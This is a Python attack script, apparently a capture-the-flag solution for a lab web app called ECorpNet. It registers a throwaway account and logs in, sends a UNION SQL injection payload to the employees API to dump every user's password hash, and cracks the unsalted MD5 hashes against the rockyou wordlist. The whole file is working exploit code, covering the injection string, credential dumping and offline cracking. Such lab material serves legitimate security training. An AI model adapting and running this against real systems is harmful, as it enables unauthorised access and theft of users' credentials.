#!/usr/bin/env python3
"""ECorpNet: steps 2-4. Register a contractor, dump users via SQLi, crack the MD5s.

    python3 gethash.py                                  # target 192.168.50.116
    python3 gethash.py -t 192.168.50.116 -w ~/rockyou.txt

Each run registers a new account (limit: 5 per IP per hour).
Standard library only.
"""
import argparse, hashlib, http.cookiejar, json, os, re, secrets, sys
import urllib.error, urllib.parse, urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("-t", "--target", default="192.168.50.116", help="host[:port]")
ap.add_argument("-w", "--wordlist", help="default: rockyou.txt from the usual places")
a = ap.parse_args()
BASE = f"http://{a.target}"

jar = http.cookiejar.CookieJar()
web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def get(path, **params):
    if params:
        path += "?" + urllib.parse.urlencode(params)
    return web.open(BASE + path, timeout=10).read().decode()

def post(path, data):
    return web.open(BASE + path, urllib.parse.urlencode(data).encode(), timeout=10).read().decode()

def csrf(html):
    m = re.search(r'name="csrf_token" value="([^"]+)"', html)
    return m.group(1) if m else sys.exit("[-] csrf_token not found (is the app up?)")

# 1. register + log in as a contractor
user, pw = f"mallory{secrets.token_hex(3)}", "Passw0rd!" + secrets.token_hex(4)
html = post("/register", {"username": user, "full_name": "Mallory Riot", "company": "Allsafe",
                          "email": f"{user}@allsafe.example", "password": pw, "confirm": pw,
                          "csrf_token": csrf(get("/register"))})
if "Too many accounts" in html:
    sys.exit("[-] registration rate limit (5/hour per IP): run ctf-reset or wait")
post("/login", {"username": user, "password": pw, "csrf_token": csrf(get("/login"))})
me = json.loads(get("/api/v1/me"))
print(f"[+] registered and logged in as {me['username']} (role: {me['role']})")

# 2. UNION SQLi, 9 columns: password_hash lands in full_name, role in title
q = ("') AND 0 UNION ALL SELECT id,username,password_hash,email,role,department,"
     "phone,office,manager_id FROM users--")
rows = json.loads(get("/api/v1/employees", q=q))
hashes = {r["username"]: (r["full_name"], r["title"]) for r in rows}
print(f"[+] dumped {len(hashes)} users:")
for u, (h, role) in hashes.items():
    print(f"    {u:12} {role:10} {h}")

# 3. crack: unsalted 32-hex = raw MD5 (our own pbkdf2 hash is skipped)
md5 = {h: u for u, (h, _) in hashes.items() if re.fullmatch(r"[0-9a-f]{32}", h)}
wl = a.wordlist or next((p for p in ("/usr/share/wordlists/rockyou.txt",
                                     "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
                                     os.path.expanduser("~/rockyou.txt"), "rockyou.txt")
                         if os.path.isfile(p)), None)
if not wl:
    with open("hashes.txt", "w") as f:
        f.writelines(f"{u}:{h}\n" for h, u in md5.items())
    sys.exit("[!] no rockyou.txt found: pass -w PATH, or run\n"
             "    john --format=raw-md5 --wordlist=rockyou.txt hashes.txt   (hashes.txt written)")

print(f"[*] cracking {len(md5)} MD5 hashes with {wl} ...")
with open(wl, "rb") as f:
    for line in f:
        word = line.rstrip(b"\r\n")
        u = md5.pop(hashlib.md5(word).hexdigest(), None)
        if u:
            print(f"[+] {u}:{word.decode(errors='replace')}   ({hashes[u][1]})")
        if not md5:
            break
print(f"[*] done, {len(md5)} not cracked (expected: only pprice cracks)")
